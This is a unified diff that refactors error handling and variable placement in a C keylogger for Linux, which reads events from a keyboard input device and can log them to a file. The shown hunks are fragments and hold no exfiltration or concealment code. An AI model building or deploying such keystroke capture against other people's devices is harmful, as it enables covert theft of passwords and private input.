@@ -1,5 +1,3 @@
-#include <dirent.h>
-#include <errno.h>
 #include <fcntl.h>
 #include <linux/input-event-codes.h>
 #include <linux/input.h>
@@ -13,9 +11,7 @@
 #include "keylogger.h"
 
 int main(int argc, char *argv[]) {
-    bool shift_pressed = false, ctrl_pressed = false, meta_pressed = false, alt_pressed = false,
-         capslock_active = false, log_to_file = false;
-
+    bool log_to_file = false;
     const char *target_device_name = NULL;
 
     for (int i = 1; i < argc; i++) {
@@ -43,19 +39,21 @@ int main(int argc, char *argv[]) {
     if (log_to_file) {
         fp = fopen(LOG_FILE, "w");
         if (!fp) {
-            fprintf(stderr, "Cannot open log file\n");
+            perror("Cannot open log file");
             return EXIT_FAILURE;
         }
     }
 
     int fd = open(keyboard_path, O_RDONLY);
     if (fd == -1) {
-        fprintf(stderr, "Cannot open keyboard device: %s\n", strerror(errno));
+        perror("Cannot open keyboard device");
         if (fp) fclose(fp);
         return EXIT_FAILURE;
     }
 
     struct input_event event;
+    bool shift_pressed = false, ctrl_pressed = false, meta_pressed = false, alt_pressed = false,
+         capslock_active = false;
 
     while (true) {
         ssize_t bytes_read = read(fd, &event, sizeof(event));
@@ -90,12 +88,18 @@ int main(int argc, char *argv[]) {
                 }
             }
         } else if (bytes_read == -1) {
-            fprintf(stderr, "Error reading from keyboard device: %s\n", strerror(errno));
+            perror("Error reading from keyboard device");
             break;
         }
     }
 
-    close(fd);
-    if (fp) fclose(fp);
+    if (close(fd) == -1) {
+        perror("Error closing keyboard device");
+    }
+    if (fp) {
+        if (fclose(fp) == -1) {
+            perror("Error closing log file");
+        }
+    }
     return EXIT_SUCCESS;
 }
